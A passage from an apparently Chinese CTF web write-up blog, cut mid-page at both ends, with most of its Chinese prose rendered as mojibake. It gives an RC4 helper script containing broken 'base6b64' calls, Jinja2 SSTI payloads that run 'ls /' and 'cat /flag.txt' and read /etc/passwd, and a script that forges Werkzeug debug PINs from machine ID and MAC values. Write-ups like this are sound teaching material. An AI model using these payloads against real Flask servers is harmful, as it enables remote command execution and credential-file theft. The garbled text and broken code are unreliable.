62.8,22.9 71.5,22.9"></polygon></svg></a></p> <p>æˆ‘åšäº†ä¸€ç‚¹ç‚¹å°å°çš„æ”¹åŠ¨ï¼ŒåŠ äº†ä¸€ä¸ªurlç¼–ç åŠŸèƒ½ï¼Œè„šæœ¬å¦‚ä¸‹ï¼š</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment">#python3</span>
<span class="token comment"># -*- coding: utf-8 -*-</span>

<span class="token keyword">import</span> base64
<span class="token keyword">from</span> urllib <span class="token keyword">import</span> parse

<span class="token keyword">def</span> <span class="token function">get_message</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;è¾“å…¥ä½ çš„ä¿¡æ¯ï¼š&quot;</span><span class="token punctuation">)</span>
    s <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> s

<span class="token keyword">def</span> <span class="token function">get_key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;è¾“å…¥ä½ çš„ç§˜é’¥ï¼š&quot;</span><span class="token punctuation">)</span>
    key <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> key <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>
        key <span class="token operator">=</span> <span class="token string">'none_public_key'</span>
    <span class="token keyword">return</span> key

<span class="token keyword">def</span> <span class="token function">init_box</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">&quot;&quot;&quot;
    Sç›’
    &quot;&quot;&quot;</span>
    s_box <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#æˆ‘è¿™é‡Œæ²¡ç®¡ç§˜é’¥å°äº256çš„æƒ…å†µï¼Œå°äº256åº”è¯¥ä¸æ–­é‡å¤å¡«å……å³å¯</span>
    j <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>
        s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
    <span class="token comment">#print(type(s_box)) #for_test</span>
    <span class="token keyword">return</span> s_box

<span class="token keyword">def</span> <span class="token function">ex_encrypt</span><span class="token punctuation">(</span>plain<span class="token punctuation">,</span>box<span class="token punctuation">,</span>mode<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">&quot;&quot;&quot;
    åˆ©ç”¨PRGAç”Ÿæˆç§˜é’¥æµå¹¶ä¸å¯†æ–‡å­—èŠ‚å¼‚æˆ–ï¼ŒåŠ è§£å¯†åŒä¸€ä¸ªç®—æ³•
    &quot;&quot;&quot;</span>

    <span class="token keyword">if</span> mode <span class="token operator">==</span> <span class="token string">'2'</span><span class="token punctuation">:</span>
        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
            c_mode <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;è¾“å…¥ä½ çš„è§£å¯†æ¨¡å¼:Base64 or ordinary\n&quot;</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> c_mode <span class="token operator">==</span> <span class="token string">'Base64'</span><span class="token punctuation">:</span>
                plain <span class="token operator">=</span> base6b64decode<span class="token punctuation">(</span>plain<span class="token punctuation">)</span>
                plain <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span>plain<span class="token punctuation">)</span>
                <span class="token keyword">break</span>
            <span class="token keyword">elif</span> c_mode <span class="token operator">==</span> <span class="token string">'ordinary'</span><span class="token punctuation">:</span>
                plain <span class="token operator">=</span> plain
                <span class="token keyword">break</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Something Wrong,è¯·é‡æ–°æ–°è¾“å…¥&quot;</span><span class="token punctuation">)</span>
                <span class="token keyword">continue</span>

    res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    i <span class="token operator">=</span> j <span class="token operator">=</span><span class="token number">0</span>
    <span class="token keyword">for</span> s <span class="token keyword">in</span> plain<span class="token punctuation">:</span>
        i <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token number">256</span>
        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token number">256</span>
        box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
        t <span class="token operator">=</span> <span class="token punctuation">(</span>box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span> <span class="token number">256</span>
        k <span class="token operator">=</span> box<span class="token punctuation">[</span>t<span class="token punctuation">]</span>
        res<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">^</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span>

    cipher <span class="token operator">=</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>res<span class="token punctuation">)</span>
    <span class="token comment">#print(cipher)</span>
    <span class="token keyword">if</span>  mode <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>
        <span class="token comment"># åŒ–æˆå¯è§†å­—ç¬¦éœ€è¦ç¼–ç </span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;åŠ å¯†åçš„è¾“å‡º(æ²¡ç»è¿‡ä»»ä½•ç¼–ç ):&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span>
        <span class="token comment"># base64çš„ç›®çš„ä¹Ÿæ˜¯ä¸ºäº†å˜æˆå¯è§å­—ç¬¦</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;base64åçš„ç¼–ç :&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>base6b64encode<span class="token punctuation">(</span>cipher<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> mode <span class="token operator">==</span> <span class="token string">'2'</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;è§£å¯†åçš„å¯†æ–‡ï¼š&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;urlç¼–ç ä¹‹åå¯†æ–‡ï¼š&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">get_mode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;è¯·é€‰æ‹©åŠ å¯†æˆ–è€…è§£å¯†&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;1. Encrypt&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;2. Decode&quot;</span><span class="token punctuation">)</span>
    mode <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> mode <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>
        message <span class="token operator">=</span> get_message<span class="token punctuation">(</span><span class="token punctuation">)</span>
        key <span class="token operator">=</span> get_key<span class="token punctuation">(</span><span class="token punctuation">)</span>
        box <span class="token operator">=</span> init_box<span class="token punctuation">(</span>key<span class="token punctuation">)</span>
        ex_encrypt<span class="token punctuation">(</span>message<span class="token punctuation">,</span>box<span class="token punctuation">,</span>mode<span class="token punctuation">)</span>
    <span class="token keyword">elif</span> mode <span class="token operator">==</span> <span class="token string">'2'</span><span class="token punctuation">:</span>
        message <span class="token operator">=</span> get_message<span class="token punctuation">(</span><span class="token punctuation">)</span>
        key <span class="token operator">=</span> get_key<span class="token punctuation">(</span><span class="token punctuation">)</span>
        box <span class="token operator">=</span> init_box<span class="token punctuation">(</span>key<span class="token punctuation">)</span>
        ex_encrypt<span class="token punctuation">(</span>message<span class="token punctuation">,</span> box<span class="token punctuation">,</span> mode<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;è¾“å…¥æœ‰è¯¯ï¼&quot;</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        get_mode<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br><span class="line-number">87</span><br><span class="line-number">88</span><br><span class="line-number">89</span><br><span class="line-number">90</span><br><span class="line-number">91</span><br><span class="line-number">92</span><br><span class="line-number">93</span><br><span class="line-number">94</span><br><span class="line-number">95</span><br><span class="line-number">96</span><br><span class="line-number">97</span><br></div></div><p>å°†æˆ‘ä»¬çš„payloadè¿›è¡ŒRC4è§£å¯†ï¼š</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200718202624.png" alt="image-20200718202624055"></p> <div class="language- line-numbers-mode"><pre class="language-text"><code>{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval(&quot;__import__('os').popen('ls /').read()&quot;)}}{% endif %}{% endfor %}

urlç¼–ç ä¹‹åå¯†æ–‡ï¼š
.J%19S%C2%A5%15Km%2B%C2%94%C3%96S%C2%85%C2%8F%C2%B8%C2%97%0B%C2%90X5%C2%A4A%C3%9FMD%C2%AE%07%C2%8BS%C3%9F7%C3%98%12%C3%85r%C3%A9%1B%C3%A4%2A%C3%A7w%C3%9B%C2%9E%C3%B1h%1D%C2%82%25%C3%AD%C3%B4%06%29%7F%C3%B0o%2C%C2%9E9%08%C3%87%C3%B7u.%C3%BB%C2%95%14%C2%BFv%05%19j%C2%AEL%C3%9A-%C3%A3t%C2%AC%7FX%2C8L%C2%81%C3%91H%C3%BF%C3%B6%C3%A3%C3%9A%C3%B5%C2%9A%C2%A6%23%06%C2%A7%C2%B8%C2%BB%C2%B9%C3%A6ny%C3%98%C3%8Aj%C2%BB%25X%15%C3%97%C2%84F%24%1As%5E%C2%9B%C3%97%C2%A4%20j%C2%A5/%17%1C%C3%9Fs%C2%AF6%C3%85%C2%A5%C2%B1.%C3%A8%C2%A2Y%21%C2%A8%C3%A0%10%C2%8Aa%5D%5C%2B%C3%8E%C2%B0%C2%99%C3%A0%C2%BE%C2%87-%10x%20%5D%C3%9A%0B%C2%882P%C3%A3%C3%9C%1A%3A%3F%C3%A6%C2%B2%20%C2%A2%C3%82%C2%B9%0F%0B%C3%95G%23-%C3%A9%C2%A2%19%C3%85%C2%B2%C2%8F%22%C3%AE%C2%A3%C2%93l%C3%8A%7B%03%C3%B9%C2%B6%C2%92%C3%97%11%20%C3%9C%C3%AE%C3%AA%02
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>ä¼ å‚</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200718203130.png" alt="image-20200718202826798"></p> <p>æ ¹ç›®å½•ä¸‹å­˜åœ¨flag.txtï¼Œæ”¹ä¸€ä¸‹payloadç»§ç»­è§£å¯†ä¸€æ¬¡å³å¯</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200718203111.png" alt="image-20200718203111636"></p> <div class="language- line-numbers-mode"><pre class="language-text"><code>{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval(&quot;__import__('os').popen('cat /flag.txt').read()&quot;)}}{% endif %}{% endfor %}

urlç¼–ç ä¹‹åå¯†æ–‡ï¼š
.J%19S%C2%A5%15Km%2B%C2%94%C3%96S%C2%85%C2%8F%C2%B8%C2%97%0B%C2%90X5%C2%A4A%C3%9FMD%C2%AE%07%C2%8BS%C3%9F7%C3%98%12%C3%85r%C3%A9%1B%C3%A4%2A%C3%A7w%C3%9B%C2%9E%C3%B1h%1D%C2%82%25%C3%AD%C3%B4%06%29%7F%C3%B0o%2C%C2%9E9%08%C3%87%C3%B7u.%C3%BB%C2%95%14%C2%BFv%05%19j%C2%AEL%C3%9A-%C3%A3t%C2%AC%7FX%2C8L%C2%81%C3%91H%C3%BF%C3%B6%C3%A3%C3%9A%C3%B5%C2%9A%C2%A6%23%06%C2%A7%C2%B8%C2%BB%C2%B9%C3%A6ny%C3%98%C3%8Aj%C2%BB%25X%15%C3%97%C2%84F%24%1As%5E%C2%9B%C3%97%C2%A4%20j%C2%A5/%17%1C%C3%9Fs%C2%AF6%C3%85%C2%A5%C2%B1.%C3%A8%C2%A2Y%21%C2%A8%C3%A0%10%C2%8Aa%5D%5C%2B%C3%8E%C2%B0%C2%99%C3%A0%C2%BE%C2%87-%10x%20%5D%C3%9A%0B%C2%882P%C3%A3%C3%93%08n0%C3%AE%C3%BDb%C2%B1%C3%80%C3%B6%1F%5B%C2%88B%23~%C3%A6%C2%BC%5D%C2%81%C3%BF%C3%88d%C2%AE%C2%B8%C3%8E2%C2%92%20C%C2%B7%C2%B7%C2%95%C3%95Wj%C3%93%C2%B5%C3%AA_%C2%A1%2B%C2%87%C2%B5l%08%27%3F%C3%96
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>ä¼ å‚ï¼Œæ‹¿åˆ°flag</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200718203226.png" alt="image-20200718203226169"></p> <h3 id="i-flask"><a href="#i-flask" class="header-anchor">#</a> I_â¤ï¸_Flask</h3> <p><strong>è€ƒç‚¹ï¼š</strong></p> <ul><li><strong>flaskæ¨¡æ¿æ³¨å…¥</strong></li></ul> <p>é¢˜ç›®å­˜åœ¨ä¸€ä¸ªéšè—å‚æ•°nameï¼ŒçŸ¥é“è¿™ä¸€ç‚¹ä»¥åå¸¸è§„çš„flaskæ¡†æ¶çš„sstiçš„payloadéƒ½èƒ½æ‰“ã€‚</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200722161324.png" alt="image-20200722161316956"></p> <h3 id="flaskapp"><a href="#flaskapp" class="header-anchor">#</a> FlaskApp</h3> <p><strong>è€ƒç‚¹ï¼š</strong></p> <ul><li><strong>Flaskå¼€å¯debugæ¨¡å¼ä¼šå¯¼è‡´PINç æ”»å‡»</strong></li></ul> <p>è·å–Flaskçš„PINç éœ€è¦ä»¥ä¸‹æ¡ä»¶ï¼š</p> <ul><li>è¿è¡Œappçš„ç”¨æˆ·åï¼Œåœ¨/etc/passwd</li> <li>module nameï¼Œä¸€èˆ¬ä¸ºflask.app</li> <li><code>getattr(app, '__name__', getattr(app.__class__, '__name__'))</code>  --&gt;  ç»“æœä¸ºFlask</li> <li>app.pyçš„ç»å¯¹è·¯å¾„ï¼Œdebugæ¨¡å¼ä¸‹å°±å¯ä»¥ç›´æ¥çœ‹è§</li> <li>MACåœ°å€çš„åè¿›åˆ¶æ•°ï¼Œä¸€èˆ¬åœ¨<code>/sys/class/net/eth0/address</code></li> <li>æœºå™¨çš„IDï¼šå¯¹äºédockeræœºæ¯ä¸€ä¸ªæœºå™¨éƒ½ä¼šæœ‰è‡ªå·²å”¯ä¸€çš„idï¼Œlinuxçš„idä¸€èˆ¬å­˜æ”¾åœ¨<code>/etc/machine-id</code>æˆ–<code>/proc/sys/kernel/random/boot_i</code>ï¼Œæœ‰çš„ç³»ç»Ÿæ²¡æœ‰è¿™ä¸¤ä¸ªæ–‡ä»¶ï¼Œwindowsçš„idè·å–è·Ÿlinuxä¹Ÿä¸åŒã€‚å¯¹äºdockeræœºåˆ™è¯»å–<code>/proc/self/cgroup</code>ï¼Œåºåˆ—å·ä¸º1é‚£è¡Œ</li></ul> <p><strong>è§£é¢˜</strong></p> <p>é¢˜ç›®æœ‰base64åŠ å¯†å’Œbase64è§£å¯†çš„åŠŸèƒ½ï¼Œè¿˜æœ‰ä¸ªhintï¼šå¤±è´¥æ˜¯æˆåŠŸä¹‹æ¯ï¼Œå…ˆæµ‹è¯•æ˜¯å¦æœ‰SSTI</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200805175641.png" alt="image-20200805175641158"></p> <p>æ‹¿åˆ°è§£ç æ¨¡å—å»è§£ç </p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200805173703.png" alt="image-20200805173656453"></p> <p>æ˜¾ç„¶å­˜åœ¨SSTIï¼Œç»“åˆç»™çš„hintï¼Œçœ‹çœ‹æ˜¯å¦å¼€å¯äº†debugæ¨¡å¼ï¼Œåªéœ€è¦éšä¾¿è¾“å…¥ä¸åˆç¬¦base64ç¼–ç è§„èŒƒçš„å­—ç¬¦ä¸²è¿›è¡Œè§£ç å°±å¯ä»¥äº†</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200805173804.png" alt="image-20200805173804562"></p> <p>é¢˜ç›®å¼€å¯äº†debugæ¨¡å¼ï¼Œå¯ä»¥è€ƒè™‘ä½¿ç”¨PINç æ”»å‡»ã€‚ä¸‹é¢å°±å¼€å§‹è¯»å–å¿…è¦çš„ä¿¡æ¯</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token operator">//</span>è¯»å–ç”¨æˆ·å
<span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">if</span> c<span class="token punctuation">.</span>__name__<span class="token operator">==</span><span class="token string">'catch_warnings'</span> <span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token punctuation">{</span> c<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/etc/passwd'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200805174005.png" alt="image-20200805174005270"></p> <p>ä¾ç„¶ç”¨åŒæ ·çš„æ–¹æ³•è¯»å–å‰©ä¸‹æ‰€å¿…è¦çš„ä¿¡æ¯ï¼Œç”±ä¸è¿‡ç¨‹å¤§è‡´ç›¸åŒï¼Œè¿™é‡Œå°±ç•¥è¿‡äº†ã€‚æœ€ç»ˆåˆ©ç”¨è„šæœ¬å¾—åˆ°PINç </p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> hashlib
<span class="token keyword">from</span> itertools <span class="token keyword">import</span> chain

probably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">'flaskweb'</span>  <span class="token comment"># username</span>
    <span class="token string">'flask.app'</span><span class="token punctuation">,</span>  <span class="token comment"># modname</span>
    <span class="token string">'Flask'</span><span class="token punctuation">,</span>  <span class="token comment"># getattr(app, '__name__', getattr(app.__class__, '__name__'))</span>
    <span class="token string">'/usr/local/lib/python3.7/site-packages/flask/app.py'</span>  <span class="token comment"># getattr(mod, '__file__', None),</span>
<span class="token punctuation">]</span>

private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">'2485410516817'</span><span class="token punctuation">,</span>  <span class="token comment"># str(uuid.getnode()),  /sys/class/net/eth0/address</span>
    <span class="token string">'6c729797fddf9cd2b01fb10d359bb020ffdc1b17621333bca5289136d2c88701'</span>  <span class="token comment"># get_machine_id(),/proc/self/cgroup</span>
<span class="token punctuation">]</span>

h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> bit<span class="token punctuation">:</span>
        <span class="token keyword">continue</span>
    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>
h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'cookiesalt'</span><span class="token punctuation">)</span>

cookie_name <span class="token operator">=</span> <span class="token string">'__wzd'</span> <span class="token operator">+</span> h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">]</span>

num <span class="token operator">=</span> <span class="token boolean">None</span>
<span class="token keyword">if</span> num <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'pinsalt'</span><span class="token punctuation">)</span>
    num <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%09d'</span> <span class="token operator">%</span> <span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>

rv <span class="token operator">=</span> <span class="token boolean">None</span>
<span class="token keyword">if</span> rv <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            rv <span class="token operator">=</span> <span class="token string">'-'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>num<span class="token punctuation">[</span>x<span class="token punctuation">:</span>x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>
                          <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        rv <span class="token operator">=</span> num

<span class="token keyword">print</span><span class="token punctuation">(</span>rv<span class="token punctuation">)</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span 